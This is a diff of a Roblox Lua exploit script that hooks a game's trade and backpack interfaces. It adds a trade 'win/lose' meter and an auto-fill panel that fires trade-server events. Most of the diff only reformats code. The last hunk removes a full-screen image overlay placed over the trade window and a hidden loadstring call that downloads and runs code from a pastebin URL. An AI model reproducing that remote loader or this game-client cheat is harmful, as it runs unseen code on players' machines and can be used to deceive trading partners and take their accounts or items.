 	UICorner2.Parent = TextButton
 	TextButton.MouseButton1Click:Connect(function()
@@ -1079,19 +637,15 @@ for i, v in ipairs(t1.MODE_ORDER) do
 			v206()
 			v205()
 			task.defer(function()
-				if BackpackApp then
-					BackpackApp:refresh_rendered_items()
-				end
+				if BackpackApp then BackpackApp:refresh_rendered_items() end
 			end)
 		end
 	end)
 	t17[v] = TextButton
 end
-
 v206()
 
 local TextLabel = Instance.new("TextLabel")
-
 TextLabel.Name = "ResultLabel"
 TextLabel.BackgroundTransparency = 1
 TextLabel.Position = UDim2.new(0, 0, 0, 40)
@@ -1103,7 +657,6 @@ TextLabel.TextScaled = true
 TextLabel.Parent = Frame
 
 local Frame3 = Instance.new("Frame")
-
 Frame3.Name = "BarContainer"
 Frame3.Position = UDim2.new(0, 8, 0, 88)
 Frame3.Size = UDim2.new(1, -16, 0, 56)
@@ -1113,18 +666,15 @@ Frame3.ClipsDescendants = true
 Frame3.Parent = Frame
 
 local UICorner2 = Instance.new("UICorner")
-
 UICorner2.CornerRadius = UDim.new(0, 12)
 UICorner2.Parent = Frame3
 
 local UIStroke = Instance.new("UIStroke")
-
 UIStroke.Color = Color3.fromRGB(20, 20, 20)
 UIStroke.Thickness = 2
 UIStroke.Parent = Frame3
 
 local Frame4 = Instance.new("Frame")
-
 Frame4.Name = "BarFill"
 Frame4.Size = UDim2.new(0.5, 0, 1, 0)
 Frame4.BackgroundColor3 = Color3.fromRGB(192, 57, 43)
@@ -1132,12 +682,10 @@ Frame4.BorderSizePixel = 0
 Frame4.Parent = Frame3
 
 local UICorner3 = Instance.new("UICorner")
-
 UICorner3.CornerRadius = UDim.new(0, 12)
 UICorner3.Parent = Frame4
 
 local TextLabel2 = Instance.new("TextLabel")
-
 TextLabel2.Name = "LeftValue"
 TextLabel2.BackgroundTransparency = 1
 TextLabel2.Position = UDim2.new(0, 14, 0, 0)
@@ -1151,7 +699,6 @@ TextLabel2.ZIndex = 3
 TextLabel2.Parent = Frame3
 
 local TextLabel3 = Instance.new("TextLabel")
-
 TextLabel3.Name = "RightValue"
 TextLabel3.BackgroundTransparency = 1
 TextLabel3.Position = UDim2.new(1, -90, 0, 0)
@@ -1165,7 +712,6 @@ TextLabel3.ZIndex = 3
 TextLabel3.Parent = Frame3
 
 local TextLabel4 = Instance.new("TextLabel")
-
 TextLabel4.Name = "DiffLabel"
 TextLabel4.AnchorPoint = Vector2.new(0.5, 0.5)
 TextLabel4.Position = UDim2.new(0.5, 0, 0.5, 0)
@@ -1180,12 +726,10 @@ TextLabel4.ZIndex = 3
 TextLabel4.Parent = Frame3
 
 local UICorner4 = Instance.new("UICorner")
-
 UICorner4.CornerRadius = UDim.new(1, 0)
 UICorner4.Parent = TextLabel4
 
 local Frame5 = Instance.new("Frame")
-
 Frame5.Name = "Pointer"
 Frame5.AnchorPoint = Vector2.new(0.5, 0)
 Frame5.Position = UDim2.new(0.5, 0, 1, 2)
@@ -1195,49 +739,18 @@ Frame5.BorderSizePixel = 0
 Frame5.Parent = Frame
 
 local t19 = {
-	{
-		max = 0.45,
-		label = "WIN",
-		bg = Color3.fromRGB(39, 174, 96),
-		fill = Color3.fromRGB(30, 150, 80)
-	},
-	{
-		max = 0.49,
-		label = "SMALL WIN",
-		bg = Color3.fromRGB(88, 214, 141),
-		fill = Color3.fromRGB(60, 190, 110)
-	},
-	{
-		max = 0.51,
-		label = "FAIR",
-		bg = Color3.fromRGB(155, 89, 182),
-		fill = Color3.fromRGB(130, 60, 160)
-	},
-	{
-		max = 0.55,
-		label = "MINI LOSE",
-		bg = Color3.fromRGB(230, 126, 34),
-		fill = Color3.fromRGB(200, 100, 20)
-	},
-	{
-		max = 1.01,
-		label = "LOSE",
-		bg = Color3.fromRGB(231, 76, 60),
-		fill = Color3.fromRGB(192, 57, 43)
-	}
+	{ max = 0.45, label = "WIN", bg = Color3.fromRGB(39, 174, 96), fill = Color3.fromRGB(30, 150, 80) },
+	{ max = 0.49, label = "SMALL WIN", bg = Color3.fromRGB(88, 214, 141), fill = Color3.fromRGB(60, 190, 110) },
+	{ max = 0.51, label = "FAIR", bg = Color3.fromRGB(155, 89, 182), fill = Color3.fromRGB(130, 60, 160) },
+	{ max = 0.55, label = "MINI LOSE", bg = Color3.fromRGB(230, 126, 34), fill = Color3.fromRGB(200, 100, 20) },
+	{ max = 1.01, label = "LOSE", bg = Color3.fromRGB(231, 76, 60), fill = Color3.fromRGB(192, 57, 43) }
 }
 local t18 = {
 	SetCategory = function(p51)
 		local v227 = t19[#t19]
-
 		for _, v in ipairs(t19) do
-			if p51 < v.max then
-				v227 = v
-
-				break
-			end
+			if p51 < v.max then v227 = v break end
 		end
-
 		TextLabel.Text = v227.label
 		Frame3.BackgroundColor3 = v227.bg
 		Frame4.BackgroundColor3 = v227.fill
@@ -1245,7 +758,6 @@ local t18 = {
 	end,
 	SetFillRatio = function(p52)
 		local v230 = math.clamp(p52, 0, 1)
-
 		TweenService:Create(Frame4, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {
 			Size = UDim2.new(v230, 0, 1, 0)
 		}):Play()
@@ -1254,115 +766,77 @@ local t18 = {
 
 t18.Update = function(p53, p54)
 	local SetFillRatio, n7, v233
-
 	if p53 then
 		local v234 = p53
 		local v235 = p54
 		local v236
-
 		if v235 then
 			local v237 = v235
-
 			TextLabel2.Text = string.format("%.2f", v234)
 			TextLabel3.Text = string.format("%.2f", v237)
-
 			local v238 = v234 - v237
 			local text
-
-			if v238 >= 0 then
-				text = "+" .. string.format("%.2f", v238)
-			else
-				text = "" .. string.format("%.2f", v238)
-			end
-
+			if v238 >= 0 then text = "+" .. string.format("%.2f", v238)
+			else text = "" .. string.format("%.2f", v238) end
 			TextLabel4.Text = text
 			v236 = v234 + v237
 		else
 			TextLabel2.Text = string.format("%.2f", v234)
 			TextLabel3.Text = string.format("%.2f", 0)
-
 			local v240 = v234 - 0
 			local text
-
-			if v240 >= 0 then
-				text = "+" .. string.format("%.2f", v240)
-			else
-				text = "" .. string.format("%.2f", v240)
-			end
-
+			if v240 >= 0 then text = "+" .. string.format("%.2f", v240)
+			else text = "" .. string.format("%.2f", v240) end
 			TextLabel4.Text = text
 			v236 = v234 + 0
 		end
-
 		v233 = v236 > 0
-
 		if not v233 then
 			t18.SetCategory(0.5)
 			SetFillRatio = t18.SetFillRatio
 			n7 = 0.5
 			SetFillRatio(n7)
-
 			return
 		end
-
 		v233 = v234 / v236
-
 		if not v233 then
 			t18.SetCategory(0.5)
 			SetFillRatio = t18.SetFillRatio
 			n7 = 0.5
 			SetFillRatio(n7)
-
 			return
 		end
-
 		t18.SetCategory(v233)
 		SetFillRatio = t18.SetFillRatio
 		n7 = v233
 	else
 		local v242 = p54
-
 		if v242 then
 			local v243 = v242
-
 			TextLabel2.Text = string.format("%.2f", 0)
 			TextLabel3.Text = string.format("%.2f", v243)
-
 			local v244 = 0 - v243
 			local text
-
-			if v244 >= 0 then
-				text = "+" .. string.format("%.2f", v244)
-			else
-				text = "" .. string.format("%.2f", v244)
-			end
-
+			if v244 >= 0 then text = "+" .. string.format("%.2f", v244)
+			else text = "" .. string.format("%.2f", v244) end
 			TextLabel4.Text = text
-
 			local v246 = 0 + v243
-
 			v233 = v246 > 0
-
 			if not v233 then
 				t18.SetCategory(0.5)
 				SetFillRatio = t18.SetFillRatio
 				n7 = 0.5
 				SetFillRatio(n7)
-
 				return
 			end
-
 			v233 = 0 / v246
-
 			if not v233 then
 				t18.SetCategory(0.5)
 				SetFillRatio = t18.SetFillRatio
 				n7 = 0.5
 				SetFillRatio(n7)
-
 				return
 			end
-
 			t18.SetCategory(v233)
 			SetFillRatio = t18.SetFillRatio
 			n7 = v233
@@ -1375,72 +849,34 @@ t18.Update = function(p53, p54)
 			n7 = 0.5
 		end
 	end
-
 	SetFillRatio(n7)
 end
 
 local function v247(p55)
-	if typeof(p55) ~= "Instance" then
-		return nil
-	end
-
+	if typeof(p55) ~= "Instance" then return nil end
 	local Button = p55:FindFirstChild("Button", true)
-
-	if Button then
-		return Button
-	end
-
+	if Button then return Button end
 	return p55:FindFirstChildWhichIsA("GuiButton", true) or p55
 end
 local function v249(p56, p57)
-	if not (typeof(p56) == "Instance" and p57) then
-		return
-	end
-
+	if not (typeof(p56) == "Instance" and p57) then return end
 	local item_data = p57.item_data
-
-	if not item_data and p57.kind then
-		item_data = p57
-	end
-
-	if not item_data then
-		return
-	end
-
+	if not item_data and p57.kind then item_data = p57 end
+	if not item_data then return end
 	local category = item_data.category or p57.category
-
-	if not category then
-		return
-	end
-
+	if not category then return end
 	local v252 = v247(p56)
-
-	if category == "food" then
-		v252 = p56
-	end
-
-	if not v252 then
-		return
-	end
-
+	if category == "food" then v252 = p56 end
+	if not v252 then return end
 	local v253 = v51(item_data)
 	local n8 = 0
 	local ok, result = pcall(function()
 		return t1.val(v253, item_data.properties, category, item_data)
 	end)
-
-	if ok and type(result) == "number" then
-		n8 = result
-	end
-
+	if ok and type(result) == "number" then n8 = result end
 	local AmvggValue = v252:FindFirstChild("AmvggValue", true)
-
-	if AmvggValue then
-		AmvggValue:Destroy()
-	end
-
+	if AmvggValue then AmvggValue:Destroy() end
 	local TextLabel5 = Instance.new("TextLabel")
-
 	TextLabel5.Name = "AmvggValue"
 	TextLabel5.Size = UDim2.new(1.5, 0, 0, 20)
 	TextLabel5.Position = category == "food" and UDim2.new(-0.25, 0, 0, -4) or UDim2.new(-0.25, 0, 0, 3)
@@ -1458,48 +894,34 @@ local function v249(p56, p57)
 	TextLabel5.Parent = v252
 end
 
-local t20 = {
-	"item",
-	"pet"
-}
+local t20 = { "item", "pet" }
 local t21 = {}
 
 local function v261(p58, p59)
 	local v262 = p58[p59]
-
-	if type(v262) ~= "function" then
-		return
-	end
-
+	if type(v262) ~= "function" then return end
 	local v263 = t21[v262]
-
 	if not v263 then
 		v263 = function(p60, p61, ...)
 			local v264 = table.pack(v262(p60, p61, ...))
-
 			if p61 and (p61.item_data or p61.kind) and typeof(v264[1]) == "Instance" then
 				pcall(v249, v264[1], p61)
 			end
-
 			return table.unpack(v264, 1, v264.n)
 		end
 		t21[v262] = v263
 	end
-
 	p58[p59] = v263
 end
 local function v265()
 	local t22 = {}
 	local t23 = { BackpackButtonCreator }
-
 	if BackpackApp and BackpackApp.button_creator then
 		table.insert(t23, BackpackApp.button_creator)
 	end
-
 	for _, v in ipairs(t23) do
 		if v and not t22[v] then
 			t22[v] = true
-
 			for _, v2 in ipairs(t20) do
 				v261(v, v2)
 			end
@@ -1507,54 +929,22 @@ local function v265()
 	end
 end
 local function v272(p62)
-	if not p62 then
-		return nil
-	end
-
-	if typeof(p62.frame) == "Instance" then
-		return p62.frame
-	end
-
-	if typeof(p62.button) == "Instance" then
-		return p62.button
-	end
-
+	if not p62 then return nil end
+	if typeof(p62.frame) == "Instance" then return p62.frame end
+	if typeof(p62.button) == "Instance" then return p62.button end
 	local unique = p62.unique or p62.item_data and p62.item_data.unique
 	local hash = p62.hash
-
-	if not BackpackApp then
-		return nil
-	end
-
-	for _, v in ipairs({
-		BackpackApp.scroll,
-		BackpackApp.content
-	}) do
-		if not v then
-			continue
-		end
-
+	if not BackpackApp then return nil end
+	for _, v in ipairs({ BackpackApp.scroll, BackpackApp.content }) do
+		if not v then continue end
 		local ipairs_ = ipairs
-		local t24 = {
-			unique,
-			hash,
-			unique and tostring(unique),
-			hash and tostring(hash)
-		}
-
+		local t24 = { unique, hash, unique and tostring(unique), hash and tostring(hash) }
 		for _, v2 in ipairs_(t24) do
-			if not v2 then
-				continue
-			end
-
+			if not v2 then continue end
 			local v281 = v:FindFirstChild(v2, true)
-
-			if v281 then
-				return v281
-			end
+			if v281 then return v281 end
 		end
 	end
-
 	return nil
 end
 local function v282()
@@ -1563,13 +953,9 @@ local function v282()
 			for _, v in pairs(BackpackApp.button_by_unique) do
 				if v.item_data or v.kind and v then
 					local v285 = v272(v)
-
-					if v285 then
-						pcall(v249, v285, v)
-					end
+					if v285 then pcall(v249, v285, v) end
 				end
 			end
-
 			return
 		end
 	end
@@ -1579,13 +965,10 @@ v265()
 
 if BackpackApp then
 	local _render_category_async = BackpackApp._render_category_async
-
 	if type(_render_category_async) == "function" then
 		BackpackApp._render_category_async = function(p63, ...)
 			local v287 = table.pack(_render_category_async(p63, ...))
-
 			task.defer(v282)
-
 			return table.unpack(v287, 1, v287.n)
 		end
 	end
@@ -1595,63 +978,43 @@ local function refresh()
 	local ok, result, result2 = pcall(function()
 		local _, v293 = t1.GetItemsFromMyOffer()
 		local _, v295 = t1.GetItemsFromPartnerOffer()
-
 		return v293, v295
 	end)
-
-	if not ok then
-		result = 0
-		result2 = 0
-	end
-
+	if not ok then result = 0 result2 = 0 end
 	local Update = t18.Update
 	local v297 = result or 0
-
 	Update(v297, result2 or 0)
-
 	return result or 0, result2 or 0
 end
 
 t18.Refresh = refresh
-v205 = function()
-	t18.Refresh()
-end
+v205 = function() t18.Refresh() end
 t18.Update(0, 0)
 task.spawn(function()
 	while true do
-		if TradeApp.instance.Frame.Visible == true then
-			ScreenGui.Enabled = true
-		else
-			ScreenGui.Enabled = false
-		end
-
+		if TradeApp.instance.Frame.Visible == true then ScreenGui.Enabled = true
+		else ScreenGui.Enabled = false end
 		wait(0.1)
 	end
 end)
 
 local refresh_all = TradeApp.refresh_all
-
 TradeApp.refresh_all = function(...)
 	local t25 = { refresh_all(...) }
 	local _ = pcall(t18.Refresh)
-
 	return table.unpack(t25)
 end
 
-if BackpackApp then
-	BackpackApp:refresh_rendered_items()
-end
+if BackpackApp then BackpackApp:refresh_rendered_items() end
 
 local RouterClient = load("RouterClient")
 local ScreenGui2 = Instance.new("ScreenGui")
-
 ScreenGui2.Name = "AutoFillGui"
 ScreenGui2.ResetOnSpawn = false
 ScreenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui2.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
 local Frame6 = Instance.new("Frame")
-
 Frame6.Name = "AutoFillFrame"
 Frame6.AnchorPoint = Vector2.new(0, 0)
 Frame6.Position = UDim2.new(0, 10, 0.5, -80)
@@ -1662,7 +1025,6 @@ Frame6.Active = true
 Frame6.Parent = ScreenGui2
 
 local UICorner5 = Instance.new("UICorner")
-
 UICorner5.CornerRadius = UDim.new(0, 14)
 UICorner5.Parent = Frame6
 
@@ -1676,22 +1038,18 @@ Frame6.InputBegan:Connect(function(input)
 		Position3 = input.Position
 		Position4 = Frame6.Position
 		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then
-				u306 = false
-			end
+			if input.UserInputState == Enum.UserInputState.End then u306 = false end
 		end)
 	end
 end)
 UserInputService.InputChanged:Connect(function(input)
 	if u306 and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
 		local v309 = input.Position - Position3
-
 		Frame6.Position = UDim2.new(Position4.X.Scale, Position4.X.Offset + v309.X, Position4.Y.Scale, Position4.Y.Offset + v309.Y)
 	end
 end)
 
 local TextLabel5 = Instance.new("TextLabel")
-
 TextLabel5.BackgroundTransparency = 1
 TextLabel5.Position = UDim2.new(0, 8, 0, 6)
 TextLabel5.Size = UDim2.new(1, -16, 0, 20)
@@ -1703,38 +1061,16 @@ TextLabel5.TextXAlignment = Enum.TextXAlignment.Left
 TextLabel5.Parent = Frame6
 
 local t26 = {
-	win = {
-		ratio = 0.78,
-		label = "WIN",
-		color = Color3.fromRGB(39, 174, 96)
-	},
-	small_win = {
-		ratio = 0.91,
-		label = "SM.WIN",
-		color = Color3.fromRGB(52, 195, 120)
-	},
-	fair = {
-		ratio = 1,
-		label = "FAIR",
-		color = Color3.fromRGB(52, 152, 219)
-	},
-	mini_lose = {
-		ratio = 1.1,
-		label = "M.LOSE",
-		color = Color3.fromRGB(230, 126, 34)
-	}
+	win = { ratio = 0.78, label = "WIN", color = Color3.fromRGB(39, 174, 96) },
+	small_win = { ratio = 0.91, label = "SM.WIN", color = Color3.fromRGB(52, 195, 120) },
+	fair = { ratio = 1, label = "FAIR", color = Color3.fromRGB(52, 152, 219) },
+	mini_lose = { ratio = 1.1, label = "M.LOSE", color = Color3.fromRGB(230, 126, 34) }
 }
 
-for i, v in ipairs({
-	"win",
-	"small_win",
-	"fair",
-	"mini_lose"
-}) do
+for i, v in ipairs({ "win", "small_win", "fair", "mini_lose" }) do
 	local v314 = t26[v]
 	local v315 = 30 + math.floor((i - 1) / 2) * 36
 	local TextButton = Instance.new("TextButton")
-
 	TextButton.Name = "Fill_" .. v
 	TextButton.Position = UDim2.new(0, 8 + (i - 1) % 2 * 128, 0, v315)
 	TextButton.Size = UDim2.new(0, 124, 0, 32)
@@ -1747,7 +1083,6 @@ for i, v in ipairs({
 	TextButton.Parent = Frame6
 
 	local UICorner6 = Instance.new("UICorner")
-
 	UICorner6.CornerRadius = UDim.new(0, 8)
 	UICorner6.Parent = TextButton
 	TextButton.MouseEnter:Connect(function()
@@ -1766,7 +1101,6 @@ for i, v in ipairs({
 end
 
 local TextLabel6 = Instance.new("TextLabel")
-
 TextLabel6.Name = "SideStatus"
 TextLabel6.BackgroundTransparency = 1
 TextLabel6.Position = UDim2.new(0, 8, 0, 108)
@@ -1783,7 +1117,6 @@ task.spawn(function()
 		local ok, result = pcall(function()
 			return TradeApp.instance.Frame.Visible
 		end)
-
 		ScreenGui2.Enabled = ok and result == true
 		task.wait(0.15)
 	end
@@ -1795,23 +1128,18 @@ local function v321(p64, p65)
 end
 local function v322()
 	local t27 = {}
-
 	if BackpackApp then
 		if type(BackpackApp.button_by_unique) == "table" then
 			for k, v in pairs(BackpackApp.button_by_unique) do
 				local item_data = v.item_data or v.kind and v or nil
-
 				if item_data then
 					local category = item_data.category
-
 					if category then
 						local v328 = v51(item_data)
 						local n9 = 0
-
 						pcall(function()
 							n9 = t1.val(v328, item_data.properties, category, item_data)
 						end)
-
 						if n9 > 0 then
 							table.insert(t27, {
 								unique = item_data.unique or k,
@@ -1823,11 +1151,9 @@ local function v322()
 					end
 				end
 			end
-
 			return t27
 		end
 	end
-
 	return t27
 end
 local function v330()
@@ -1835,40 +1161,29 @@ local function v330()
 	local ok, result = pcall(function()
 		return TradeApp:_get_my_offer()
 	end)
-
 	if ok and result then
 		if type(result.items) == "table" then
 			for _, item in ipairs(result.items) do
-				if item.unique then
-					t28[item.unique] = true
-				end
+				if item.unique then t28[item.unique] = true end
 			end
 		end
 	end
-
 	return t28
 end
 local function v336(p66, p67, p68)
 	local v337 = p68 or 0.14
-
 	table.sort(p66, function(p69, p70)
 		return p69.value > p70.value
 	end)
-
 	local t29 = {}
 	local n10 = 0
-
 	for _, v in ipairs(p66) do
-		if #t29 >= 18 or p67 <= n10 then
-			break
-		end
-
+		if #t29 >= 18 or p67 <= n10 then break end
 		if n10 + v.value <= p67 * (1 + v337) then
 			table.insert(t29, v)
 			n10 += v.value
 		end
 	end
-
 	return t29, n10
 end
 
@@ -1878,89 +1193,64 @@ _G.doAutoFill = function(p71)
 	if not u342 then
 		u342 = true
 		task.spawn(function()
-			pcall(function()
-				TradeApp:refresh_all()
-			end)
+			pcall(function() TradeApp:refresh_all() end)
 			task.wait(0.25)
-
 			local _, v344 = t1.GetItemsFromPartnerOffer()
 			local v345 = v344 or 0
-
 			if v345 <= 0 then
 				v321("Партнёр не добавил предметы!", Color3.fromRGB(200, 60, 60))
 				u342 = false
-
 				return
 			end
-
 			local v346 = t26[p71]
 			local v347 = v345 * v346.ratio
-
 			v321(string.format("Партнёр: %.2f → Цель: %.2f [%s]", v345, v347, v346.label), Color3.fromRGB(50, 50, 50))
-
 			local ok, result = pcall(function()
 				return TradeApp:_get_my_offer()
 			end)
-
 			if ok and result and type(result.items) == "table" and #result.items > 0 then
 				local t30 = {}
-
 				for _, item in ipairs(result.items) do
 					table.insert(t30, item)
 				end
-
 				for _, v in ipairs(t30) do
 					pcall(function()
 						TradeApp:_remove_item_from_my_offer(v)
 					end)
 					task.wait(0.12)
 				end
-
 				task.wait(0.25)
 			end
-
 			local v355 = v322()
 			local v356 = v330()
 			local t31 = {}
-
 			for _, v in ipairs(v355) do
 				if not v356[v.unique] then
 					table.insert(t31, v)
 				end
 			end
-
 			if #t31 == 0 then
 				v321("Нет предметов с известной ценностью!", Color3.fromRGB(200, 60, 60))
 				u342 = false
-
 				return
 			end
-
 			local v360, v361 = v336(t31, v347)
-
 			if #v360 == 0 then
 				v321(string.format("Нет подходящих под %.2f", v347), Color3.fromRGB(200, 60, 60))
 				u342 = false
-
 				return
 			end
-
 			local n11 = 0
-
 			for _, v in ipairs(v360) do
 				if pcall(function()
 					RouterClient.get("TradeAPI/AddItemToOffer"):FireServer(v.unique)
 				end) then
 					n11 += 1
 				end
-
 				task.wait(0.12)
 			end
-
 			task.wait(0.3)
-			pcall(function()
-				TradeApp:refresh_all()
-			end)
+			pcall(function() TradeApp:refresh_all() end)
 			task.wait(0.15)
 			t18.Refresh()
 			v321(string.format("✓ [%s] %d пред. | мой: %.2f / партнёр: %.2f", v346.label, n11, v361, v345), Color3.fromRGB(30, 140, 60))
@@ -1969,34 +1259,7 @@ _G.doAutoFill = function(p71)
 			end)
 			u342 = false
 		end)
-
 		return
 	end
-
 	v321("Подождите, идёт заполнение...", Color3.fromRGB(200, 150, 30))
 end
-
-local function v365(p72, p73)
-	writefile(p73 .. ".png", game:HttpGet(p72))
-
-	return getcustomasset(p73 .. ".png")
-end
-
-local ScreenGui3 = Instance.new("ScreenGui")
-
-ScreenGui3.IgnoreGuiInset = true
-ScreenGui3.DisplayOrder = 9999999
-ScreenGui3.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-
-local ImageLabel = Instance.new("ImageLabel")
-
-ImageLabel.Size = UDim2.fromOffset(400, 400)
-
-local Frame7 = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeApp"):WaitForChild("Frame")
-
-ImageLabel.AnchorPoint = Frame7.AnchorPoint
-ImageLabel.Position = UDim2.new(Frame7.Position.X.Scale, Frame7.Position.X.Offset, Frame7.Position.Y.Scale, Frame7.Position.Y.Offset - 150)
-ImageLabel.BackgroundTransparency = 1
-ImageLabel.Image = v365("https://raw.githubusercontent.com/viwochk/i/refs/heads/main/Untitled61_20260624172245.png", "dsfgdfg")
-ImageLabel.Parent = ScreenGui3
-loadstring(game:HttpGet("https://pastebin.com/raw/PnhkxZ0Q"))()
